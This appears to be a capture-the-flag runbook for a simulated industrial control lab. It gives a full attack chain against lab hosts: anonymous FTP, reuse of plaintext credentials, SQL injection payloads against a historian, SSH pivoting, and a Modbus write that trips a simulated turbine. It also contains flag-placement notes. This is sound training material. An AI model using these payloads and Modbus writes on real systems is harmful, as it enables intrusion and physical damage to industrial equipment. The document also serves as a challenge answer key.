# Runbook: full chain, enterprise to turbine trip

Three-zone attack chain from jump-host entry to turbine emergency stop. Covers initial
access, credential exfiltration, lateral movement, process recon, and state manipulation.

- Techniques in order: trust exploitation, data exfiltration, lateral movement, process intelligence, state manipulation
- Challenge type: Realist
- Difficulty: Advanced

## Components to start

Full environment:

```
cd ics-simlab
make generate && make build && make build-jump-host
make up
sudo make firewall
```

Participant entry point: SSH to the jump-host. For local testing, the jump-host SSH port
is mapped to 2222:

```
ssh -i ~/.ssh/ctf_key moist@localhost -p 2222
```

For Hetzner deployment, run `bash infrastructure/jump-host/setup.sh` first, then `make up`.

## Attack path

### Stage 1: enterprise recon (trust exploitation)

```bash
# On jump-host
cat README.txt
# Enterprise network: 10.10.1.0/24
# Known hosts: 10.10.1.10, 10.10.1.20

nmap -sV 10.10.1.10 10.10.1.20
# 10.10.1.10: 21/ftp, 22/ssh, 139/smb, 445/smb, 23/telnet
# 10.10.1.20: 22/ssh

# Anonymous FTP to legacy workstation
ftp 10.10.1.10
> Name: anonymous
> Password: (blank)
> ls
  network-inventory.txt
  operational-sops.pdf
  credentials-2019.txt
> get network-inventory.txt
> get credentials-2019.txt
> quit

cat network-inventory.txt
# Lists operational zone IPs: 10.10.2.10 (historian), 10.10.2.20 (scada), 10.10.2.30 (eng-ws)
```

### Stage 2: enterprise workstation pivot (trust exploitation, data exfiltration)

```bash
# SSH to enterprise workstation with weak password
ssh bursar@10.10.1.20
# Password: Octavo1

cat ~/.config/ops-access.conf
# historian_host=10.10.2.10
# historian_user=hist_admin
# historian_pass=Historian2015
# scada_url=http://10.10.2.20:8080
# scada_user=admin
# scada_pass=admin

cat ~/pull_monthly_report.sh
# Hardcoded: hist_admin:Historian2015
```

### Stage 3: historian exfiltration (data exfiltration)

```bash
# From enterprise workstation (10.10.2.100 has operational zone access)
curl "http://10.10.2.10:8080/report?asset=turbine'+OR+1=1--"
# SQL error discloses table names including alarm_config

curl "http://10.10.2.10:8080/report?asset=turbine'+UNION+SELECT+asset,threshold_type,CAST(value+AS+TEXT)+FROM+alarm_config--"
# Returns alarm thresholds:
# turbine_rpm  | overspeed   | 1800
# relay_a_oc   | overcurrent | 150
# relay_a_uv   | undervoltage | 195
```

### Stage 4: engineering workstation and control zone access (lateral movement)

```bash
# SSH to engineering workstation (dual-homed: 10.10.2.30 / 10.10.3.100)
ssh engineer@10.10.2.30
# Password: spanner99

cat engineering_notes.txt
# All zone credentials, IPs, and device types listed in plaintext
# turbine PLC: 10.10.3.21, turbine_admin:turbineadmin

ls ~/tools/
# modbus_read.py  modbus_write.py  relay_a_2019.txt  relay_b_2019.txt

# Read turbine PLC state from control zone
python3 modbus_read.py 10.10.3.21 502 holding 0 10
# HR[0]=1500 (RPM setpoint), HR[1]=45 (fuel valve%), HR[2]=0 (trip=False), HR[3]=150 (OC threshold)
```

### Stage 5: turbine trip (process intelligence, state manipulation)

```bash
# Confirm live turbine state (process intelligence)
python3 modbus_read.py 10.10.3.21 502 coil 0 1
# [False]: estop not active

# Emergency stop (state manipulation)
python3 modbus_write.py 10.10.3.21 502 coil 0 1
# Write accepted

# Physics engine fires: RPM drops to zero, temperature falls, alarms trigger
# Flag written to HR[9] by TurbinePhysics on estop condition
python3 modbus_read.py 10.10.3.21 502 holding 9 1
# [RM{flag_value}]: flag encoded as integer or split across `HR[9]`/`HR[10]`
```

## Flag placement

Modify `zones/control/components/turbine-plc/turbine_hil.py`: in the estop handling
block, write the flag value to `HR[9]` (and `HR[10]` if a longer string is needed). The flag
is only present after the estop fires. A participant who trips the turbine without first
reading `HR[9]` will find it immediately; one who reads before tripping will see it appear.

In `ctf-config.yaml`, set an environment variable `CTF_FLAG=RM{...}` and read it in
`turbine_hil.py` to avoid hardcoding the flag value in the source.

## Why most OT attacks start in IT

The full chain demonstrates an OT attack that does not start in the control zone. The turbine
PLC is unreachable until stage 4. Every step before that is IT infrastructure: legacy
protocols, credential reuse, weak passwords, plaintext configuration files. The OT
component is the last 30 seconds of a multi-hour operation. The [ICS-CERT advisory ICSA-10-090-01](/_static/presentations/ICSA-10-090-01.pdf) and the
[Ukraine 2015 BlackEnergy incident](https://www.boozallen.com/content/dam/boozallen/documents/2016/09/ukraine-report-when-the-lights-went-out.pdf) follow exactly this pattern.

## Same chain, different endpoint

Replace the turbine estop with IED relay threshold manipulation (`HR[2] = 0` via relay
Modbus, control logic manipulation): the relay trips spuriously on any load, not on demand.
The participant reaches the same point in the network but the impact is subtler and harder to
detect. That variant sits at the same difficulty but uses control logic manipulation instead
of state manipulation.
